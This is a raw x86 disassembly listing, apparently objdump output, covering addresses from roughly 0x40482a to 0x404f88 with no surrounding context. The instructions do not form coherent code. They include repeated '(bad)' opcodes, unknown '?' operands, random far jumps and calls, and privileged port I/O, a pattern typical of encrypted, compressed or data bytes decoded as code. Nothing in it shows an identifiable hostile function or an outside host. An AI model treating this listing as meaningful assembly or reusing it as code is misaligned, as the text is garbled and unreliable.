  40482a:	pop    ebp
  40482b:	adc    esi,0x28
  40482e:	xchg   ebx,eax
  40482f:	int3   
  404830:	call   0x2880df61
  404835:	enter  0x86e2,0xe3
  404839:	jmp    0x4047ef
  40483b:	nop
  40483c:	out    0x64,al
  40483e:	ins    DWORD PTR es:[edi],dx
  40483f:	dec    ebx
  404840:	and    edx,ecx
  404842:	popf   
  404843:	xor    edx,DWORD PTR [eax]
  404845:	shl    DWORD PTR [esi+0x23],cl
  404848:	add    bh,BYTE PTR [edx-0x361cad91]
  40484e:	or     ebp,ecx
  404850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404851:	xchg   esp,eax
  404852:	jb     0x4048bd
  404854:	in     eax,0x65
  404856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404857:	call   0x4ae8:0x89186c65
  40485e:	les    ebp,FWORD PTR [edi-0x62]
  404861:	push   cs
  404862:	push   ds
  404863:	ret    
  404864:	fwait
  404865:	inc    esp
  404866:	pop    esp
  404867:	stos   BYTE PTR es:[edi],al
  404868:	sti    
  404869:	outs   dx,DWORD PTR ds:[esi]
  40486a:	sub    esp,ecx
  40486c:	shl    ecx,0x4e
  40486f:	loopne 0x40480a
  404871:	add    eax,0xe8918a45
  404876:	fucomi st,st(3)
  404878:	rol    DWORD PTR [edi+0x37],0xd9
  40487c:	adc    esi,DWORD PTR [edi+0x4a905cb2]
  404882:	fcomp  st(1)
  404884:	inc    ebp
  404885:	jne    0x404888
  404887:	(bad)  
  404888:	and    dl,cl
  40488a:	call   0x98dee8a4
  40488f:	mov    dh,0xdd
  404891:	xchg   edi,eax
  404892:	mov    gs,WORD PTR [ecx-0xa59cf20]
  404898:	out    dx,eax
  404899:	mov    DWORD PTR [ebx],esp
  40489b:	pop    ss
  40489c:	and    bl,BYTE PTR [eax-0x2a8a4d3f]
  4048a2:	add    esi,DWORD PTR [ebp-0x365f2a67]
  4048a8:	(bad)  
  4048a9:	out    dx,eax
  4048aa:	pusha  
  4048ab:	rol    DWORD PTR [ebx+edx*4-0x56],1
  4048af:	pop    es
  4048b0:	inc    esi
  4048b1:	rcr    DWORD PTR ss:[edi+esi*4-0x3d7eb33a],1
  4048b9:	or     BYTE PTR [ebx+0x4d352087],0xe5
  4048c0:	inc    ecx
  4048c1:	or     BYTE PTR [ebx],al
  4048c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048c4:	lsl    edx,WORD PTR [edx+0x4c]
  4048c8:	add    BYTE PTR [edi+0x1],dh
  4048cb:	cwde   
  4048cc:	jb     0x40487f
  4048ce:	in     al,0xc5
  4048d0:	daa    
  4048d1:	cdq    
  4048d2:	arpl   WORD PTR [eax+edx*8],bx
  4048d5:	jmp    0x3bd7:0xe677b0e1
  4048dc:	sub    al,0x54
  4048de:	in     eax,dx
  4048df:	jno    0x4048c4
  4048e1:	push   ebx
  4048e2:	fwait
  4048e3:	imul   edi,DWORD PTR [edx-0x108e29df],0x4d
  4048ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048eb:	cs (bad) 
  4048ed:	dec    edi
  4048ee:	or     eax,0x7421d373
  4048f3:	xor    ebx,DWORD PTR [ecx-0x31]
  4048f6:	sub    DWORD PTR [ebx-0x10],ecx
  4048f9:	mov    ah,0x24
  4048fb:	xchg   esp,eax
  4048fc:	lahf   
  4048fd:	sub    DWORD PTR [edx-0x30],0xffffffa2
  404901:	push   ss
  404902:	arpl   WORD PTR ds:0x6f78630a,di
  404908:	jb     0x40491d
  40490a:	mov    eax,ds:0x38d314b8
  40490f:	fisub  DWORD PTR [edx+eax*1]
  404912:	mov    dl,0xab
  404914:	outs   dx,DWORD PTR ds:[esi]
  404915:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404917:	add    DWORD PTR gs:[eax+0x362a8b36],ebp
  40491e:	xchg   BYTE PTR [eax],ah
  404920:	mov    edi,0x53fcf94d
  404925:	mov    ah,BYTE PTR [eax]
  404927:	mov    al,ds:0x1c81b92e
  40492c:	mov    al,ds:0xc309c103
  404931:	xchg   edx,eax
  404932:	and    eax,0x2606b120
  404937:	mov    ds:0x60cb98c0,eax
  40493c:	in     al,0x69
  40493e:	pop    edi
  40493f:	mov    ah,dl
  404941:	jge    0x4048cf
  404943:	mov    ebp,0xe449175c
  404948:	int3   
  404949:	icebp  
  40494a:	mov    ebp,0xbb03fde8
  40494f:	in     eax,0x79
  404951:	outs   dx,BYTE PTR ds:[esi]
  404952:	imul   edx,ecx,0xf04cefcc
  404958:	cmp    al,0x27
  40495a:	lahf   
  40495b:	in     al,dx
  40495c:	ja     0x4049d8
  40495e:	push   esi
  40495f:	jl     0x4048ee
  404961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404962:	nop
  404963:	or     eax,0x3040c38f
  404968:	repz pop ds
  40496a:	les    esi,FWORD PTR [ebp+0x3f2f03f]
  404970:	std    
  404971:	lods   eax,DWORD PTR ds:[esi]
  404972:	and    BYTE PTR [edi],cl
  404974:	pop    ds
  404975:	test   BYTE PTR [ebp+esi*1+0x3e],cl
  404979:	fadd   DWORD PTR [ecx-0x5e]
  40497c:	cmc    
  40497d:	mov    edi,0xa81efbb1
  404982:	jmp    0x404943
  404984:	ret    
  404985:	mov    ah,0x9f
  404987:	int3   
  404988:	dec    esi
  404989:	stc    
  40498a:	imul   ebx,DWORD PTR [ecx],0x6b2ac81a
  404990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404991:	and    dl,ch
  404993:	fs mov bh,0xd2
  404996:	stos   DWORD PTR es:[edi],eax
  404997:	loop   0x4049fb
  404999:	repz (bad) 
  40499b:	cld    
  40499c:	popf   
  40499d:	mov    WORD PTR [esi-0x2c],?
  4049a0:	cli    
  4049a1:	inc    ecx
  4049a2:	mov    dl,0x1a
  4049a4:	jnp    0x4049d0
  4049a6:	xchg   dl,cl
  4049a8:	add    al,0x53
  4049aa:	cmc    
  4049ab:	es xor esi,edi
  4049ae:	jb     0x40495e
  4049b0:	cmp    BYTE PTR [ebp+esi*4-0x78],0xf7
  4049b5:	mov    bh,0x39
  4049b7:	fisttp DWORD PTR [bx-0x4365]
  4049bc:	retf   
  4049bd:	lods   al,BYTE PTR ds:[esi]
  4049be:	loop   0x404a0d
  4049c0:	cs inc esi
  4049c2:	push   ecx
  4049c3:	in     al,0xcf
  4049c5:	pop    ebx
  4049c6:	rcl    DWORD PTR [ecx+0xe],cl
  4049c9:	enter  0x5863,0x8b
  4049cd:	xchg   esp,eax
  4049ce:	dec    edi
  4049cf:	pop    esi
  4049d0:	mov    DWORD PTR [edx-0x6c8dd31],eax
  4049d6:	test   eax,0xac0e21fc
  4049db:	mov    dl,BYTE PTR [ebp+edx*4+0x3b]
  4049df:	jno    0x4049ae
  4049e1:	jne    0x4049a6
  4049e3:	ret    0x1654
  4049e6:	pop    edx
  4049e7:	lods   al,BYTE PTR ds:[esi]
  4049e8:	clc    
  4049e9:	test   al,0xaf
  4049eb:	adc    eax,0x468d3d04
  4049f0:	leave  
  4049f1:	lea    ebx,[eax]
  4049f3:	fwait
  4049f4:	pop    es
  4049f5:	cmp    ah,BYTE PTR [ebx-0x4cffc76f]
  4049fb:	stos   DWORD PTR es:[edi],eax
  4049fc:	lds    ebx,FWORD PTR [esp+edi*2-0x7f364bfa]
  404a03:	or     ch,BYTE PTR [ecx+0xf6729f4]
  404a09:	xor    BYTE PTR [ebx+edi*8-0x7b],ch
  404a0d:	fld    st(2)
  404a0f:	push   cs
  404a10:	out    dx,eax
  404a11:	stc    
  404a12:	fwait
  404a13:	arpl   WORD PTR [edx+0x456faa96],si
  404a19:	mov    es,esp
  404a1b:	iret   
  404a1c:	std    
  404a1d:	push   0xad6e9df6
  404a22:	loope  0x4049b4
  404a24:	lods   eax,DWORD PTR ds:[esi]
  404a25:	rcr    BYTE PTR [ecx+0x59836243],cl
  404a2b:	mov    ebp,0x5c32315a
  404a30:	mov    WORD PTR [esi],?
  404a32:	enter  0x85f0,0xc2
  404a36:	sub    DWORD PTR [ecx-0x365c1435],edx
  404a3c:	pop    eax
  404a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a3e:	in     al,0x36
  404a40:	xor    eax,0xe9811657
  404a45:	push   ecx
  404a46:	test   DWORD PTR [ebp+0x30],ebp
  404a49:	ret    0xf265
  404a4c:	scas   eax,DWORD PTR es:[edi]
  404a4d:	sbb    ch,BYTE PTR [ebx-0x18da9bc5]
  404a53:	xor    DWORD PTR [ecx],esp
  404a55:	xchg   esi,eax
  404a56:	int    0x18
  404a58:	adc    ebp,DWORD PTR [edx-0x56]
  404a5b:	mov    al,0x47
  404a5d:	pop    ebp
  404a5e:	loop   0x404ab5
  404a60:	cmp    DWORD PTR [ebp+0x22],eax
  404a63:	sbb    esi,esi
  404a65:	pop    ss
  404a66:	mov    DWORD PTR [ecx-0x79],esi
  404a69:	imul   edi,DWORD PTR [eax],0x5836b630
  404a6f:	stos   BYTE PTR es:[edi],al
  404a70:	mov    al,0xbf
  404a72:	mov    ecx,0x409f28fd
  404a77:	shr    ah,1
  404a79:	mov    ah,0x5
  404a7b:	or     DWORD PTR [ebp+0x2e],edi
  404a7e:	hlt    
  404a7f:	dec    edx
  404a80:	sub    edi,DWORD PTR [edx]
  404a82:	outs   dx,BYTE PTR ds:[esi]
  404a83:	pop    esi
  404a84:	mov    BYTE PTR [esi-0x64],dl
  404a87:	xchg   esi,eax
  404a88:	in     eax,dx
  404a89:	inc    esi
  404a8a:	add    DWORD PTR [ebp-0x5ca887e4],esp
  404a90:	jmp    0xfa9caa2e
  404a95:	fcmovnb st,st(5)
  404a97:	repnz fldcw WORD PTR [bp+di-0x24]
  404a9c:	pop    esp
  404a9d:	push   edx
  404a9e:	stos   BYTE PTR es:[edi],al
  404a9f:	and    esp,DWORD PTR [ebp-0x5ff73e4]
  404aa5:	test   ah,bh
  404aa7:	nop
  404aa8:	and    ch,BYTE PTR [edx]
  404aaa:	int3   
  404aab:	or     edi,ecx
  404aad:	push   ecx
  404aae:	inc    DWORD PTR [edi+0x2712a1f2]
  404ab4:	fs (bad) 
  404ab6:	call   0x8c65ec4d
  404abb:	xchg   ecx,eax
  404abc:	fld    st(3)
  404abe:	push   eax
  404abf:	cmp    eax,0x8c2a51b4
  404ac4:	pop    ds
  404ac5:	repnz push edx
  404ac7:	into   
  404ac8:	das    
  404ac9:	pusha  
  404aca:	cmp    al,0x23
  404acc:	and    esi,ebx
  404ace:	jmp    0xd5f1:0x9ea4fe4c
  404ad5:	das    
  404ad6:	adc    al,0xe0
  404ad8:	fsub   QWORD PTR ds:0x43aaed3e
  404ade:	sbb    eax,0x29385ec7
  404ae3:	mov    eax,0x6a21c07f
  404ae8:	les    edx,FWORD PTR [edx]
  404aea:	mov    cl,0xb
  404aec:	jns    0x404b3e
  404aee:	jo     0x404b18
  404af0:	(bad)  
  404af1:	cmp    eax,0xce4ade19
  404af6:	jmp    0x404af6
  404af8:	inc    edx
  404af9:	pop    ecx
  404afa:	(bad)  
  404afb:	fisttp WORD PTR [ebp+0x48]
  404afe:	mov    eax,ds:0x90deac02
  404b03:	sar    ah,cl
  404b05:	xor    ecx,0xffffffc2
  404b08:	es jae 0x404abf
  404b0b:	test   al,0xc5
  404b0d:	pop    eax
  404b0e:	jbe    0x404b43
  404b10:	test   DWORD PTR [edx],edi
  404b12:	test   BYTE PTR [ecx+edi*4-0x47],al
  404b16:	pop    ss
  404b17:	repz out 0xc8,eax
  404b1a:	test   al,0x90
  404b1c:	sar    BYTE PTR ds:0xe5ffd669,cl
  404b22:	cmp    BYTE PTR cs:[ecx-0x6dce1edf],bl
  404b29:	xlat   BYTE PTR ds:[ebx]
  404b2a:	test   BYTE PTR [ebp-0x57d448f],dh
  404b30:	es leave 
  404b32:	ins    BYTE PTR es:[edi],dx
  404b33:	outs   dx,BYTE PTR ds:[esi]
  404b34:	(bad)  
  404b35:	xchg   ebp,eax
  404b36:	cdq    
  404b37:	outs   dx,BYTE PTR ds:[esi]
  404b38:	push   esi
  404b39:	xchg   esi,eax
  404b3a:	mov    ah,0x2e
  404b3c:	cdq    
  404b3d:	pushf  
  404b3e:	sbb    eax,0xabeb8485
  404b43:	pop    ds
  404b44:	add    ebx,DWORD PTR [esi-0x17]
  404b47:	(bad)  
  404b48:	mov    ah,0x61
  404b4a:	cmp    ebp,DWORD PTR [ebx-0x41]
  404b4d:	aad    0xc0
  404b4f:	(bad)  
  404b50:	push   ebp
  404b51:	mov    eax,0x45c58138
  404b56:	mov    esi,0xe37f36a2
  404b5b:	cld    
  404b5c:	and    DWORD PTR [edi],ebp
  404b5e:	push   ds
  404b5f:	mov    ah,0x14
  404b61:	loope  0x404b1f
  404b63:	sar    DWORD PTR [edx],cl
  404b65:	loopne 0x404b78
  404b67:	add    BYTE PTR [esi-0x2ba26dea],ah
  404b6d:	popa   
  404b6e:	xchg   bl,ah
  404b70:	fwait
  404b71:	cdq    
  404b72:	outs   dx,BYTE PTR ds:[esi]
  404b73:	leave  
  404b74:	inc    eax
  404b75:	stos   DWORD PTR es:[edi],eax
  404b76:	mov    ch,0xa0
  404b78:	mov    WORD PTR [edx-0x80],gs
  404b7b:	bound  edx,QWORD PTR ds:[ecx]
  404b7e:	loop   0x404b82
  404b80:	imul   eax,DWORD PTR [ebx],0x73
  404b83:	add    al,0x69
  404b85:	xor    BYTE PTR [eax+0x7d0810e0],dh
  404b8b:	mov    al,ds:0xf17f0782
  404b90:	dec    ebp
  404b91:	inc    ebp
  404b92:	cmp    eax,0xe6f2e6b
  404b97:	dec    edx
  404b98:	push   esi
  404b99:	inc    eax
  404b9a:	cs or  al,0x41
  404b9d:	ins    BYTE PTR es:[edi],dx
  404b9e:	cs push ss
  404ba0:	mov    esp,gs
  404ba2:	test   BYTE PTR [edx+ebx*1],cl
  404ba5:	outs   dx,BYTE PTR ds:[esi]
  404ba6:	loopne 0x404beb
  404ba8:	xor    al,0x33
  404baa:	js     0x404c1e
  404bac:	clc    
  404bad:	add    eax,0x5789be45
  404bb2:	call   0x767c55f2
  404bb7:	mov    dl,0x95
  404bb9:	lea    ebp,[edx]
  404bbb:	aaa    
  404bbc:	mov    ebp,0x2eb4711
  404bc1:	in     eax,dx
  404bc2:	or     al,0x9d
  404bc4:	and    dh,BYTE PTR [esi-0x1b]
  404bc7:	dec    esi
  404bc8:	cs pop ebp
  404bca:	shl    esp,1
  404bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bcd:	shr    BYTE PTR [ebx],1
  404bcf:	mov    bl,0x55
  404bd1:	adc    ebx,0x62e35990
  404bd7:	cmp    al,0xa6
  404bd9:	adc    BYTE PTR [ecx-0x58d3b3f5],dh
  404bdf:	push   edi
  404be0:	mov    esp,0xcca32369
  404be5:	lods   eax,DWORD PTR ds:[esi]
  404be6:	push   0xffffffca
  404be8:	push   esi
  404be9:	lock dec eax
  404beb:	cli    
  404bec:	pop    ds
  404bed:	xor    ecx,DWORD PTR [eax]
  404bef:	mov    bl,0x9
  404bf1:	ret    
  404bf2:	in     eax,0x5f
  404bf4:	cmp    al,0xd6
  404bf6:	sub    DWORD PTR [esi-0xf512158],edi
  404bfc:	dec    edx
  404bfd:	mov    al,ds:0x6b61d2c3
  404c02:	in     al,dx
  404c03:	stos   BYTE PTR es:[edi],al
  404c04:	pusha  
  404c05:	and    ebp,esi
  404c07:	push   cs
  404c08:	mov    gs,WORD PTR [edi+0x281b8650]
  404c0e:	inc    ecx
  404c0f:	in     eax,0x3b
  404c11:	push   edx
  404c12:	inc    esi
  404c13:	add    dh,BYTE PTR ds:[esp+eiz*8+0x40]
  404c18:	and    BYTE PTR [esi],bh
  404c1a:	mov    esp,0x1215ef7
  404c1f:	into   
  404c20:	rcl    ch,1
  404c22:	js     0x404bbb
  404c24:	les    edi,FWORD PTR [edx+ebp*1+0x4a]
  404c28:	xor    DWORD PTR [esi+eiz*4-0x6d],ecx
  404c2c:	outs   dx,BYTE PTR ds:[esi]
  404c2d:	rcr    DWORD PTR [ecx-0x38],1
  404c30:	cmc    
  404c31:	dec    edx
  404c32:	cld    
  404c33:	sar    BYTE PTR [ecx-0x16],cl
  404c36:	inc    edx
  404c37:	inc    eax
  404c38:	mov    BYTE PTR [eax-0x17],0x51
  404c3c:	(bad)  
  404c3d:	jno    0x404c19
  404c3f:	mov    ecx,0x323dc4d0
  404c44:	jmp    0x9085:0x4dbf74de
  404c4b:	mov    bh,0xa2
  404c4d:	cmc    
  404c4e:	in     eax,dx
  404c4f:	mov    ds:0x1f478361,al
  404c54:	arpl   WORD PTR [ecx],si
  404c56:	out    0xb8,al
  404c58:	fsubr  DWORD PTR ds:0xb9b8395b
  404c5e:	stc    
  404c5f:	and    BYTE PTR [ebp+esi*1+0x13],cl
  404c63:	jmp    0xfb53:0x65a8ce6f
  404c6a:	ret    0x4cb8
  404c6d:	fs hlt 
  404c6f:	dec    ebp
  404c70:	cmp    eax,0x8cb83ac4
  404c75:	sub    ebp,esi
  404c77:	sub    DWORD PTR [ebx+edi*1-0x27168d76],ebp
  404c7e:	out    0xc8,al
  404c80:	popa   
  404c81:	pop    esp
  404c82:	dec    edx
  404c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c84:	mov    ah,0xdd
  404c86:	lods   al,BYTE PTR ds:[esi]
  404c87:	jge    0x404cb9
  404c89:	retf   
  404c8a:	mov    ebp,0xc5fde110
  404c8f:	push   esp
  404c90:	je     0x404c3c
  404c92:	mov    ds:0x4a1e7341,eax
  404c97:	cmp    al,0xc5
  404c99:	fwait
  404c9a:	mov    cl,0xa3
  404c9c:	fcmovnbe st,st(4)
  404c9e:	mov    ch,0x6b
  404ca0:	test   DWORD PTR [ebx+edx*2],ebx
  404ca3:	add    cl,ch
  404ca5:	pop    es
  404ca6:	sbb    BYTE PTR [edx+0x5b],0x5
  404caa:	ds push ss
  404cac:	xor    ebp,ebx
  404cae:	mov    ds:0xc2ac242f,al
  404cb3:	add    ecx,DWORD PTR [edi-0x47]
  404cb6:	(bad)  
  404cb7:	jns    0x404c5b
  404cb9:	mul    BYTE PTR [ecx+0x7d]
  404cbc:	loopne 0x404cb1
  404cbe:	out    dx,eax
  404cbf:	mov    ds:0x93f9057f,al
  404cc4:	out    dx,eax
  404cc5:	sar    DWORD PTR [edi+0x5e40f979],1
  404ccb:	rol    BYTE PTR [ecx+0x6da3f566],0x0
  404cd2:	inc    eax
  404cd3:	adc    edx,DWORD PTR [ecx]
  404cd5:	fnstsw WORD PTR [edi+0x3d2c0704]
  404cdb:	(bad)  
  404cdc:	dec    edx
  404cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cde:	sub    ebp,DWORD PTR [edx-0x12d08508]
  404ce4:	fiadd  WORD PTR [edx+0x45]
  404ce7:	cli    
  404ce8:	test   eax,0xbcfded8
  404ced:	mov    ?,edx
  404cef:	jl     0x404d46
  404cf1:	mov    bh,0x5f
  404cf3:	stos   DWORD PTR es:[edi],eax
  404cf4:	pushf  
  404cf5:	pop    ebp
  404cf6:	frstor ds:0x750201ec
  404cfc:	pop    ds
  404cfd:	outs   dx,DWORD PTR ds:[esi]
  404cfe:	pop    esp
  404cff:	xchg   DWORD PTR [eax+ecx*1-0xc],esi
  404d03:	and    ah,BYTE PTR [esi-0x78]
  404d06:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  404d08:	or     BYTE PTR [edx-0x2c],bh
  404d0b:	pop    ebx
  404d0c:	add    al,ch
  404d0e:	mov    ds:0x462c5236,al
  404d13:	xor    esp,DWORD PTR [esi]
  404d15:	and    DWORD PTR [esi-0x584e2746],ecx
  404d1b:	fcmovb st,st(4)
  404d1d:	jo     0x404cf7
  404d1f:	mov    ds:0xfedff798,al
  404d24:	mov    esp,0xbfcb1619
  404d29:	adc    eax,esi
  404d2b:	cli    
  404d2c:	shl    BYTE PTR [edi],1
  404d2e:	cmp    ecx,DWORD PTR [edi]
  404d30:	fnstcw WORD PTR [esi]
  404d32:	inc    ebp
  404d33:	sub    BYTE PTR [ebx],dh
  404d35:	loopne 0x404d85
  404d37:	lods   eax,DWORD PTR ds:[esi]
  404d38:	mov    ds:0x96d68d89,al
  404d3d:	mov    edx,0xe27dc931
  404d42:	sub    al,0xc4
  404d44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d45:	(bad)  
  404d47:	mov    edi,0xef7f1754
  404d4c:	mov    edi,0xbf6b5e62
  404d51:	xchg   ebx,eax
  404d52:	and    ecx,DWORD PTR [edi]
  404d54:	lods   al,BYTE PTR ds:[esi]
  404d55:	scas   eax,DWORD PTR es:[edi]
  404d56:	out    dx,al
  404d57:	cmp    DWORD PTR [eax],esi
  404d59:	dec    ebx
  404d5a:	fmul   DWORD PTR [edi-0x66]
  404d5d:	fwait
  404d5e:	retf   
  404d5f:	mov    dh,BYTE PTR [edi-0x36fcd41b]
  404d65:	pop    es
  404d66:	fst    DWORD PTR [esi]
  404d68:	adc    BYTE PTR [eax+ebx*4+0x6d],ch
  404d6c:	mov    dh,0x36
  404d6e:	jmp    0x9f0a:0xb0dcfa60
  404d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d76:	lods   al,BYTE PTR ds:[esi]
  404d77:	sahf   
  404d78:	adc    bh,BYTE PTR [edx-0x789712fe]
  404d7e:	ret    0x3626
  404d81:	push   edx
  404d82:	ja     0x404de6
  404d84:	mov    ebp,0x386e4537
  404d89:	xlat   BYTE PTR ds:[ebx]
  404d8a:	xor    al,0xff
  404d8c:	mov    ebx,0xebe1139d
  404d91:	xor    dl,dh
  404d93:	xor    ah,BYTE PTR [eax+0x342bd464]
  404d99:	test   al,0x4f
  404d9b:	sub    ecx,eax
  404d9d:	or     al,BYTE PTR [ebp-0x75]
  404da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404da1:	dec    esp
  404da2:	iret   
  404da3:	dec    eax
  404da4:	dec    eax
  404da5:	inc    edi
  404da6:	icebp  
  404da7:	cmp    dh,BYTE PTR [edx+0x31a877f7]
  404dad:	mov    ebp,ecx
  404daf:	imul   cl
  404db1:	scas   al,BYTE PTR es:[edi]
  404db2:	fadd   DWORD PTR [edx]
  404db4:	(bad)  
  404db5:	mov    eax,ds:0xd1cf73cb
  404dba:	jg     0x404e23
  404dbc:	mov    eax,0x467ebe2b
  404dc1:	bound  ebx,QWORD PTR [eax]
  404dc3:	retf   0xf252
  404dc6:	and    BYTE PTR [edi-0x5c],0x48
  404dca:	mov    ds:0xfbbc850d,al
  404dcf:	(bad)  
  404dd0:	je     0x404e06
  404dd2:	js     0x404e20
  404dd4:	mov    dh,0x95
  404dd6:	std    
  404dd7:	inc    eax
  404dd8:	push   es
  404dd9:	mov    WORD PTR [ebx-0x5e30e991],?
  404ddf:	or     al,0xd2
  404de1:	cld    
  404de2:	jmp    0x978d:0xa060f069
  404de9:	inc    esp
  404dea:	enter  0xe1c7,0x86
  404dee:	xor    ah,BYTE PTR [ecx+0x4c]
  404df1:	es pop ecx
  404df3:	pop    ds
  404df4:	xchg   edx,eax
  404df5:	mov    bh,0x49
  404df7:	es mov ebp,fs
  404dfa:	mov    ds,esp
  404dfc:	push   esp
  404dfd:	pop    eax
  404dfe:	or     edx,DWORD PTR fs:[ebp-0x7148ae5e]
  404e05:	aaa    
  404e06:	sub    BYTE PTR [esi+eax*4],ah
  404e09:	jo     0x404dcc
  404e0b:	mov    dl,dl
  404e0d:	cdq    
  404e0e:	inc    eax
  404e0f:	cmp    ch,BYTE PTR [ecx+edx*8]
  404e12:	sahf   
  404e13:	sbb    eax,0xb28510a
  404e18:	jnp    0x404e69
  404e1a:	xchg   BYTE PTR [edi-0x23070fbf],dh
  404e20:	fst    DWORD PTR [esi]
  404e22:	sar    DWORD PTR [edx+0x3a],0x42
  404e26:	sub    cl,BYTE PTR ds:0x76aaa3f1
  404e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e2d:	pushf  
  404e2e:	call   0x5166:0x98a144d0
  404e35:	sahf   
  404e36:	push   edx
  404e37:	div    DWORD PTR [ebp+0x1f]
  404e3a:	lahf   
  404e3b:	pop    ebp
  404e3c:	add    DWORD PTR [esi-0x7d],ebp
  404e3f:	push   eax
  404e40:	push   es
  404e41:	shl    BYTE PTR [ecx],1
  404e43:	jae    0x404dd7
  404e45:	inc    ecx
  404e46:	sub    ax,0xf6e6
  404e4a:	scas   eax,DWORD PTR es:[edi]
  404e4b:	addr16 out 0x97,eax
  404e4e:	sti    
  404e4f:	fistp  QWORD PTR [ecx]
  404e51:	inc    ebx
  404e52:	pushf  
  404e53:	dec    edi
  404e54:	imul   esp,eax,0x5493f1db
  404e5a:	and    al,BYTE PTR [edx-0x1f41299a]
  404e60:	int3   
  404e61:	lahf   
  404e62:	test   BYTE PTR [ebx],0x57
  404e65:	sub    ah,ch
  404e67:	ret    0xdf77
  404e6a:	jbe    0x404ec6
  404e6c:	aaa    
  404e6d:	mov    cl,0xea
  404e6f:	or     eax,0xcc308041
  404e74:	call   0x65a91c25
  404e79:	fnstcw WORD PTR [esi-0x61494887]
  404e7f:	call   0x63e458bc
  404e84:	js     0x404e74
  404e86:	jl     0x404ea8
  404e88:	stos   BYTE PTR es:[edi],al
  404e89:	into   
  404e8a:	jmp    0xad2bbcb8
  404e8f:	jne    0x404ec9
  404e91:	fbstp  TBYTE PTR [esi]
  404e93:	push   0xc6736c21
  404e98:	jnp    0x404ef2
  404e9a:	mov    ebp,0x40a81200
  404e9f:	push   edi
  404ea0:	int3   
  404ea1:	inc    ebx
  404ea2:	xor    eax,0xfcea0923
  404ea7:	outs   dx,BYTE PTR ds:[esi]
  404ea8:	(bad)  
  404ea9:	repz sub DWORD PTR [edx],edx
  404eac:	aaa    
  404ead:	mov    dl,0x29
  404eaf:	pop    esi
  404eb0:	popa   
  404eb1:	in     al,dx
  404eb2:	adc    al,0x5f
  404eb4:	outs   dx,BYTE PTR ds:[esi]
  404eb5:	ret    
  404eb6:	xor    DWORD PTR [edi-0x541ed664],edx
  404ebc:	inc    esi
  404ebd:	jbe    0x404edf
  404ebf:	adc    al,0x88
  404ec1:	imul   ecx,DWORD PTR [edx+edi*2-0x45],0x7b
  404ec6:	mov    edi,ebx
  404ec8:	push   edx
  404ec9:	xor    BYTE PTR [esi-0x1c],dh
  404ecc:	jae    0x404e73
  404ece:	dec    edx
  404ecf:	scas   eax,DWORD PTR es:[edi]
  404ed0:	inc    eax
  404ed1:	cmp    al,0x43
  404ed3:	sti    
  404ed4:	xchg   ecx,eax
  404ed5:	xor    BYTE PTR [esp+ebp*2],dl
  404ed8:	fild   DWORD PTR [ecx+0x700b5fb6]
  404edf:	out    0xaa,eax
  404ee1:	dec    ebp
  404ee2:	pop    ebx
  404ee3:	cwde   
  404ee4:	mov    bh,0xb3
  404ee6:	gs in  al,dx
  404ee8:	pop    ecx
  404ee9:	sub    al,0x1a
  404eeb:	lahf   
  404eec:	mov    eax,0xba86c004
  404ef1:	std    
  404ef2:	ins    DWORD PTR es:[edi],dx
  404ef3:	mov    ah,0xf2
  404ef5:	push   edx
  404ef6:	xor    al,0xc0
  404ef8:	arpl   WORD PTR [ecx-0x6201936],sp
  404efe:	sar    BYTE PTR [ecx-0x31],1
  404f01:	xchg   esp,eax
  404f02:	loop   0x404f07
  404f04:	dec    ebx
  404f05:	push   cs
  404f06:	cdq    
  404f07:	stc    
  404f08:	jns    0x404f69
  404f0a:	in     eax,0xed
  404f0c:	and    edi,DWORD PTR [edx+eax*8-0x6c]
  404f10:	in     eax,0x21
  404f12:	and    BYTE PTR [edi-0x5c56472],cl
  404f18:	ins    DWORD PTR es:[edi],dx
  404f19:	in     al,dx
  404f1a:	jp     0x404ee9
  404f1c:	cmp    BYTE PTR [edi],bh
  404f1e:	inc    ebx
  404f1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f20:	pop    esi
  404f21:	fwait
  404f22:	fs push ebp
  404f24:	pop    ecx
  404f25:	and    al,0x8c
  404f27:	jo     0x404f65
  404f29:	add    dl,BYTE PTR [edi-0x572b8ff3]
  404f2f:	jo     0x404f9c
  404f31:	sub    bh,al
  404f33:	repz int 0x3e
  404f36:	push   eax
  404f37:	cld    
  404f38:	pop    ds
  404f39:	mov    ch,0x3f
  404f3b:	sub    edi,ebx
  404f3d:	repnz out 0x9e,al
  404f40:	and    ch,ah
  404f42:	push   0x7189a6bc
  404f47:	imul   ebx,DWORD PTR [ecx+0xb],0x5f29536b
  404f4e:	mov    WORD PTR [edi-0x80],ds
  404f51:	aam    0x24
  404f53:	push   ebp
  404f54:	lods   al,BYTE PTR ds:[esi]
  404f55:	inc    ebx
  404f56:	pop    ebx
  404f57:	sub    dl,BYTE PTR [edx-0x3d]
  404f5a:	adc    al,0x24
  404f5c:	in     al,dx
  404f5d:	stc    
  404f5e:	out    dx,eax
  404f5f:	lods   al,BYTE PTR ds:[esi]
  404f60:	js     0x404f1e
  404f62:	scas   al,BYTE PTR es:[edi]
  404f63:	sbb    dl,BYTE PTR [ebx+ebp*1-0x77f7a01b]
  404f6a:	(bad)  
  404f6b:	(bad)  
  404f6c:	ins    DWORD PTR es:[edi],dx
  404f6d:	clc    
  404f6e:	inc    eax
  404f6f:	outs   dx,BYTE PTR ds:[esi]
  404f70:	dec    ebx
  404f71:	and    bl,al
  404f73:	mov    edi,DWORD PTR [edi-0x3ed993e8]
  404f79:	out    0x1e,eax
  404f7b:	sbb    eax,0x18fe94c4
  404f80:	(bad)  [esi-0x13]
  404f83:	stc    
  404f84:	cmp    BYTE PTR [eax+0x14],0x52
  404f88:	shr    BYTE PTR [eax],1
